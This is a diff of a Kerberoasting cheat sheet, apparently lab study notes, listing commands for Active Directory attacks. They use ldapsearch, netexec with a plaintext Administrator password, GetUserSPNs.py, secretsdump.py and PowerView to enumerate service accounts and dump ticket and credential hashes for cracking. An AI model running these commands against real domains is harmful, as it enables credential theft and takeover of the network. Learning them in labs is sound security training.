@@ -8,30 +8,21 @@
 ldapsearch -x -h dc-ip -b "DC=domain,DC=com" "(servicePrincipalName=*)" servicePrincipalName sAMAccountName memberOf
 ldapsearch -x -h dc-ip -b "DC=domain,DC=com" -H ldap://dc-ip "(servicePrincipalName=*)" servicePrincipalName userAccountControl sAMAccountName
 
-# CrackMapExec
-sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
-crackmapexec ldap dc-ip -u username -p password -M kerberoast 
-cme ldap dc-ip -u 'domain\user' -p 'pass' --k --sam
+# Netexec
+nxc ldap 192.168.0.239 -u 'Administrator' -p 'sako2005!' --kerberoasting hashes.txt
 
 # SPN Users Enum and TGS Dump
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/ ( Anonymous )
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
-
-GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile kerberoast_hashes.txt
-GetUserSPNs.py -request -dc-ip dc-ip domain/user:password -outputfile spn_hashes.txt
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/user:password -request-user <KERBEROASTABLE_USER> -outputfile <HASH>
 
 # Secretdumps
 secretsdump.py -just-dc domain/admin@dc-ip
-grep -i "serviceprincipalname" dump.txt
 
 ============ From Windows ============
 # SPN Users
 Import-Module .\PowerView.ps1
-Get-DomainUser * -spn | select samaccountname,serviceprincipalname
-Get-DomainUser -LDAPFilter "(&(servicePrincipalName=*)(admincount=1))" | Select Name
 Get-DomainUser -SPN -Properties samaccountname,admincount,pwdlastset,msds-supportedencryptiontypes
+Get-DomainUser -LDAPFilter "(&(servicePrincipalName=*)(admincount=1))" | Select Name
 
 Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 tr -d ' \n' < messy_hash.txt > clean_hash.txt
